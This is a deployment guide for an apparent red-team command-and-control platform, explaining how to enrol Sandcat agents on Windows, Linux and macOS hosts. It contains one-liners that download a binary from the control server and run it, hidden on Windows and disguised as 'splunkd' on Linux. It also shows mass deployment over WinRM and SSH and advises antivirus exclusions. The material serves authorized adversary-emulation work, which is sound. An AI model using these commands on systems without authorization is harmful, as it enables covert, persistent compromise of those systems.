# Agent Deployment and Management

## Introduction

This guide covers agent deployment, enrolment, and management within the Triskele Labs Command Center. The platform's one-liner enrolment feature eliminates the need for RDP access during agent deployment, enabling security teams to deploy agents across client environments using a single command.

## Prerequisites

- Triskele Labs Command Center instance running and accessible
- Network connectivity between target systems and command center
- Appropriate credentials for target systems (PowerShell/SSH access, or RMM tool access)
- Firewall rules configured to allow agent communication on port 8888

## Agent Deployment Overview

### Zero-RDP Advantage

The one-liner enrolment approach provides significant advantages over traditional deployment methods:

| Traditional Method | Triskele One-Liner |
|--------------------|-------------------|
| RDP to each machine | Execute remotely via RMM/SSH |
| 15-20 min per host | < 30 seconds per host |
| Screen recording required | Command-line audit trail |
| Interactive session | Non-interactive execution |

### Deployment Methods

Agents can be deployed through multiple methods:

- **Remote PowerShell**: Execute via WinRM on Windows systems
- **SSH Session**: Deploy to Linux/macOS systems via SSH
- **RMM Tools**: Integrate with ConnectWise, Datto, NinjaRMM
- **GPO Startup Scripts**: Deploy organisation-wide via Group Policy
- **Configuration Management**: Ansible, Puppet, Chef integration

## Step-by-Step Agent Enrolment

### Step 1: Access the Agents Page

Navigate to the Agents management interface in the Command Center:

```
http://localhost:8888/agents
```

Alternatively, access through the navigation menu: **Campaigns → Agents**

### Step 2: Initiate Deployment

Select the **"Click to Deploy"** button to open the deployment configuration modal.

### Step 3: Configure Deployment Parameters

Configure the agent deployment based on target platform and requirements:

| Parameter | Windows | Linux/macOS |
|-----------|---------|-------------|
| Platform | `windows` | `linux` / `darwin` |
| Agent | `sandcat` | `sandcat` |
| Contact | `HTTP` | `HTTP` |
| Server | `http://<SERVER_IP>:8888` | `http://<SERVER_IP>:8888` |

**Configuration Notes**:
- Replace `<SERVER_IP>` with the actual IP address or hostname of your Command Center
- Ensure the server address is accessible from target systems
- Select contact method based on network infrastructure (HTTP is standard)

### Step 4: Copy Platform-Specific Command

The deployment modal generates platform-specific one-liner commands.

#### Windows Deployment Command

```powershell
$server="http://192.168.1.100:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go-windows");
$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
Get-Process | ? {$_.Path -like "*$name*"} | Stop-Process -Force -ErrorAction SilentlyContinue;
rm -force "C:\Users\Public\$name" -ErrorAction SilentlyContinue;
[io.file]::WriteAllBytes("C:\Users\Public\$name",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\$name -ArgumentList "-server $server -group red" -WindowStyle Hidden;
```

**Command Breakdown**:
- Downloads the Sandcat agent binary from the Command Center
- Terminates any existing agent processes
- Removes previous agent installations
- Installs the new agent binary
- Starts the agent process in hidden mode

#### Linux/macOS Deployment Command

```bash
server="http://192.168.1.100:8888";
curl -s -X POST -H "file:sandcat.go-linux" -H "platform:linux" \
  $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red &
```

**Command Breakdown**:
- Downloads the Sandcat agent binary using curl
- Sets executable permissions on the binary
- Starts the agent process in background mode
- Agent masquerades as common system process for operational security

### Step 5: Execute on Target Systems

Deploy the command to target systems using your preferred method:

#### Remote PowerShell (Windows)

```powershell
# Single host
Invoke-Command -ComputerName TARGET-HOST -ScriptBlock { 
  $server="http://192.168.1.100:8888"; 
  # ... rest of deployment command
}

# Multiple hosts
$hosts = @("HOST1", "HOST2", "HOST3")
Invoke-Command -ComputerName $hosts -ScriptBlock { 
  # ... deployment command
}
```

#### SSH (Linux/macOS)

```bash
# Single host
ssh user@target-host 'server="http://192.168.1.100:8888"; curl -s ...'

# Multiple hosts via loop
for host in host1 host2 host3; do
  ssh user@$host 'server="http://192.168.1.100:8888"; curl -s ...' &
done
wait
```

#### RMM Tool Integration

Most RMM platforms support script execution. Configure the one-liner as a script task and deploy to target systems or groups.

## Agent Management Best Practices

### Monitoring Agent Status

Regularly verify agent connectivity and health:

1. Navigate to the Agents page in the Command Center
2. Review agent status indicators:
   - **Green**: Active and communicating
   - **Yellow**: Intermittent connectivity
   - **Red**: Disconnected or unresponsive

### Agent Grouping

Organise agents into logical groups for targeted operations:

- **By Environment**: Production, staging, development
- **By Function**: Web servers, database servers, workstations
- **By Operating System**: Windows, Linux, macOS
- **By Client**: Multi-tenant MSP deployments

Groups are specified during deployment using the `-group` parameter.

### Agent Lifecycle Management

#### Updating Agents

To update deployed agents:

1. Deploy new agent version using the one-liner method
2. The new agent automatically terminates and replaces the old version
3. Verify successful update in the Agents interface

#### Removing Agents

To cleanly remove agents from target systems:

```powershell
# Windows - terminate agent process
Get-Process | Where-Object {$_.Path -like "*sandcat*"} | Stop-Process -Force
Remove-Item -Force "C:\Users\Public\sandcat*"

# Linux/macOS - terminate agent process
pkill splunkd
rm -f ./splunkd
```

### Security Considerations

When deploying and managing agents:

- **Communication Security**: Use HTTPS in production environments
- **Credential Management**: Utilise least-privilege accounts for deployment
- **Network Segmentation**: Deploy agents within appropriate network zones
- **Audit Logging**: Maintain deployment records for compliance requirements
- **Agent Persistence**: Configure agents with appropriate persistence mechanisms
- **Clean-up Procedures**: Document and follow agent removal procedures post-engagement

## Troubleshooting

### Agent Not Appearing in Command Center

**Possible Causes**:
- Firewall blocking port 8888
- Incorrect server address in deployment command
- Network connectivity issues

**Resolution**:
1. Verify firewall rules allow outbound connections to Command Center
2. Test connectivity: `Test-NetConnection <SERVER_IP> -Port 8888` (Windows) or `nc -zv <SERVER_IP> 8888` (Linux)
3. Review agent logs on target system

### Agent Disconnecting Intermittently

**Possible Causes**:
- Network instability
- Resource constraints on target system
- Antivirus interference

**Resolution**:
1. Monitor network connectivity between agent and Command Center
2. Review system resource usage on target
3. Add agent binary to antivirus exclusions

## Next Steps

- [Create and execute operations](operations.md)
- [Configure operation parameters](../getting-started/configuration.md)
- [Generate assessment reports](reporting.md)

## See Also

- [System Architecture Overview](overview.md)
- [Troubleshooting Guide](../guides/troubleshooting.md)
- [API Reference - Agents](../reference/api.md#agents)
